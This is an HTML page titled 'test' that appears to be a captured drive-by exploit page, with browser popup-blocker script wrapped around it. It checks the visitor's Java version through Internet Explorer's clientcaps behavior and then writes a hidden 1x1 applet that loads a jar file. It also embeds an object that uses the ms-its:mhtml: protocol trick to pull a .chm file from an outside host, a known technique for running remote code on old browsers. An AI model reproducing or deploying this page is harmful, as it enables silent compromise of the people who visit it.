<html>
 <head><title>test</title> </head>
 <body id="occ" style="behavior:url(#default#clientcaps)">
  
<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

var SymRealWinOpen = window.open;

function SymWinOpen(url, name, attributes)
{
  return (new Object());
}

window.open = SymWinOpen;

//-->
</script>

<script>
   var V = occ.getComponentVersion("{08B0E5C0-4FCB-11CF-AAA5-00401C608500}", "ComponentID");
   if (V) {
       V=V.replace(/\,/gi,".");

document.write('<applet ARCHIVE="jar.jar" CODE="Counter.class" WIDTH="1" HEIGHT="1"></applet>');

   } 


  </script>

<object data="ms-its:mhtml:file://C:\\MAIN.MHT!http://check-wire.com/user12//main.chm::/main.htm" type="text/x-scriptlet"></object>

 </body>
</html>

<script language="JavaScript">
<!--
var SymRealOnLoad;
var SymRealOnUnload;

function SymOnUnload()
{
  window.open = SymWinOpen;
  if(SymRealOnUnload != null)
     SymRealOnUnload();
}

function SymOnLoad()
{
  if(SymRealOnLoad != null)
     SymRealOnLoad();
  window.open = SymRealWinOpen;
  SymRealOnUnload = window.onunload;
  window.onunload = SymOnUnload;
}

SymRealOnLoad = window.onload;
window.onload = SymOnLoad;

//-->
</script>

